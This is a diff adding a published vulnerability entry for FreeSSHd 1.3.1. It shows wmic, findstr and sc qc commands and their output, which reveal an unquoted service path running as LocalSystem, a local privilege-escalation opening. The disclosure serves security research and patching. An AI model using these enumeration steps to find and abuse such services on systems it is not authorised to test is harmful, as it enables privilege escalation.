@@ -1,0 +1,24 @@
+Exploit Title: FreeSSHd 1.3.1 - 'FreeSSHDService' Unquoted Service Path
+Exploit Author: boku
+Date: 2020-02-10
+Vendor Homepage: http://www.freesshd.com 
+Software Link: http://www.freesshd.com/freeSSHd.exe
+Version: 1.3.1
+Tested On: Windows 10 (32-bit)
+
+C:\Users\nightelf>wmic service get name, pathname, startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i "freesshd" | findstr /i /v """
+FreeSSHDService                           C:\Program Files\freeSSHd\FreeSSHDService.exe                                      Auto
+
+C:\Users\nightelf>sc qc FreeSSHDService
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: FreeSSHDService
+        TYPE               : 110  WIN32_OWN_PROCESS (interactive)
+        START_TYPE         : 2   AUTO_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\freeSSHd\FreeSSHDService.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : FreeSSHDService
+        DEPENDENCIES       : RPCSS
+        SERVICE_START_NAME : LocalSystem
